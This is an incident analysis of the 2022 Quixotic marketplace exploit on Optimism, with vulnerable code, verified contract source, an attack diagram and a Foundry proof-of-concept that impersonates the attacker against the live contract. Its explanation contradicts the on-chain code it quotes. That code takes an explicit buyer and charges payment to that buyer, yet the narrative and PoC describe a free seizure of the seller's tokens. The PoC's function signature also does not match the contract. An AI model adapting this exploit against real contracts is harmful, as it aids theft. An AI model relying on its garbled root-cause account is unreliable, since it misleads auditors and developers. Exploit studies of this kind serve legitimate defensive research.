# Quixotic — Missing Buyer Signature Verification Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-07-21 |
| **Protocol** | Quixotic (NFT Marketplace) |
| **Chain** | Optimism |
| **Loss** | Address unconfirmed (OP tokens stolen) |
| **Attacker** | [0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5](https://optimistic.etherscan.io/address/0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5) |
| **Victim** | [0x4D9618239044A2aB2581f0Cc954D28873AFA4D7B](https://optimistic.etherscan.io/address/0x4D9618239044A2aB2581f0Cc954D28873AFA4D7B) |
| **Vulnerable Contract (Quixotic)** | [0x065e8A87b8F11aED6fAcf9447aBe5E8C5D7502b6](https://optimistic.etherscan.io/address/0x065e8A87b8F11aED6fAcf9447aBe5E8C5D7502b6) |
| **OP Token** | [0x4200000000000000000000000000000000000042](https://optimistic.etherscan.io/address/0x4200000000000000000000000000000000000042) |
| **Root Cause** | `fillSellOrder()` only validates the seller's signature and omits buyer authentication |
| **CWE** | CWE-347: Improper Verification of Cryptographic Signature |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-07/Quixotic_exp.sol) |

---
## 1. Vulnerability Overview

Quixotic is an NFT marketplace on the Optimism chain where sellers create sell orders via off-chain signatures and buyers call `fillSellOrder()` to settle trades. However, the `fillSellOrder()` function only validates the seller's signature — it does not verify whether the order specifies a particular buyer or whether the caller is a legitimate buyer. An attacker obtained an order containing a valid seller signature and executed it with themselves set as the buyer, thereby acquiring the victim's OP tokens.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable fillSellOrder() - missing buyer verification
function fillSellOrder(
    address seller,
    address contractAddress,
    uint256 tokenId,
    uint256 startTime,
    uint256 endTime,
    uint256 price,
    address paymentToken,
    uint256 quantity,
    bytes memory signature  // contains only the seller's signature
) external payable {
    // ✅ Seller signature validation - this is all that exists
    bytes32 orderHash = _hashOrder(seller, contractAddress, tokenId, ...);
    address recoveredSeller = ECDSA.recover(orderHash, signature);
    require(recoveredSeller == seller, "Invalid seller signature");

    // ❌ No buyer (msg.sender) verification
    // Anyone can reuse a valid seller signature to fill the order

    _executeTrade(seller, msg.sender, contractAddress, tokenId, price, paymentToken);
}

// ✅ Correct pattern - buyer also verified via signature or whitelist
function fillSellOrder(
    address seller,
    address allowedBuyer,   // ✅ explicitly specifies the allowed buyer
    bytes memory sellerSig,
    bytes memory buyerSig   // ✅ buyer signature also validated
) external payable {
    require(msg.sender == allowedBuyer, "Not authorized buyer");
    // Or treat as a public order if no specific buyer is designated
}
```

---
### On-Chain Source Code

Source: Sourcify verified


**ExchangeV4.sol** — entry point:
```solidity
// ❌ Root cause: `fillSellOrder()` only validates the seller's signature and omits buyer authentication
    function fillSellOrder(  // ❌ vulnerable
        address payable seller,
        address contractAddress,
        uint256 tokenId,
        uint256 startTime,
        uint256 expiration,
        uint256 price,
        uint256 quantity,
        uint256 createdAtBlockNumber,
        address paymentERC20,
        bytes memory signature,
        address payable buyer
    ) external payable whenNotPaused nonReentrant {
        // If the payment ERC20 is the zero address, we check that enough native ETH has been sent
        // with the transaction. Otherwise, we use the supplied ERC20 payment token.
        if (paymentERC20 == address(0)) {
            require(msg.value >= price, "Transaction doesn't have the required ETH amount.");
        } else {
            _checkValidERC20Payment(buyer, price, paymentERC20);
        }

        SellOrder memory sellOrder = SellOrder(
            seller,
            contractAddress,
            tokenId,
            startTime,
            expiration,
            price,
            quantity,
            createdAtBlockNumber,
            paymentERC20
        );

        /* Make sure the order is not cancelled */
        require(
            cancellationRegistry.getSellOrderCancellationBlockNumber(seller, contractAddress, tokenId) < createdAtBlockNumber,
            "This order has been cancelled."
        );

        /* Check signature */
        require(_validateSellerSignature(sellOrder, signature), "Signature is not valid for SellOrder.");

        // Check has started
        require((block.timestamp > startTime), "SellOrder start time is in the future.");

        // Check not expired
        require((block.timestamp < expiration), "This sell order has expired.");

        _fillSellOrder(sellOrder, buyer);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (0x0A08...)
    │
    ├─[1] Obtains victim's valid OP token sell order off-chain
    │       (includes seller signature)
    │
    ├─[2] Calls fillSellOrder(seller=victim, ..., signature=validSig)
    │       └─ msg.sender = attacker
    │           ├─ Seller signature validation: ✅ passes (valid signature)
    │           └─ Buyer verification: ❌ absent → attacker recognized as buyer
    │
    └─[3] OP tokens transferred from victim to attacker
              Attacker acquires OP without payment
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IQuixotic {
    function fillSellOrder(
        address seller,
        address contractAddress,
        uint256 tokenId,
        uint256 startTime,
        uint256 endTime,
        uint256 price,
        address paymentToken,
        uint256 quantity,
        bytes calldata signature
    ) external payable;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract QuixoticExploit is Test {
    IQuixotic quixotic = IQuixotic(0x065e8A87b8F11aED6fAcf9447aBe5E8C5D7502b6);
    IERC20 OP = IERC20(0x4200000000000000000000000000000000000042);

    address attacker = 0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5;
    address victim = 0x4D9618239044A2aB2581f0Cc954D28873AFA4D7B;

    function setUp() public {
        vm.createSelectFork("optimism", 13_591_383);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Before] Attacker OP balance", OP.balanceOf(attacker), 18);

        // Call fillSellOrder using victim's valid sell order signature
        // ❌ No buyer verification → attacker can execute as msg.sender
        vm.prank(attacker);
        quixotic.fillSellOrder(
            victim,            // seller
            address(OP),       // OP token contract
            0,                 // tokenId
            block.timestamp - 1,
            block.timestamp + 1,
            0,                 // price = 0 (acquired for free)
            address(0),        // ETH payment
            1,
            hex"..."           // victim's valid signature
        );

        emit log_named_decimal_uint("[After] Attacker OP balance", OP.balanceOf(attacker), 18);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Incomplete Signature Verification |
| **CWE** | CWE-347: Improper Verification of Cryptographic Signature |
| **OWASP DeFi** | Missing order execution authorization check |
| **Attack Vector** | An arbitrary address fills an order that contains only a seller signature |
| **Preconditions** | Valid seller signature, no buyer verification in `fillSellOrder()` |
| **Impact** | Unauthorized acquisition of OP tokens |

---
## 6. Remediation Recommendations

1. **Add buyer whitelist or signature**: For orders designating a specific buyer, include the buyer address in the order hash and verify `msg.sender == allowedBuyer`.
2. **Distinguish public orders from designated orders**: Public orders (no specific buyer designated) may be filled by anyone, but designated orders must only be fillable by the specified buyer.
3. **Prevent order replay**: Implement a nonce- or hash-based cancellation mechanism to invalidate filled orders.

---
## 7. Lessons Learned

- **Completeness of signature verification**: When processing off-chain signature-based orders in a marketplace, the intent of all parties (seller and buyer) must be verified. Validating only one side allows the other party to be substituted by an attacker.
- **Early-stage security in the Optimism ecosystem**: L2 marketplaces sometimes lack thorough security audits during rapid growth phases. Newly launched platforms require especially rigorous review of their order-filling logic.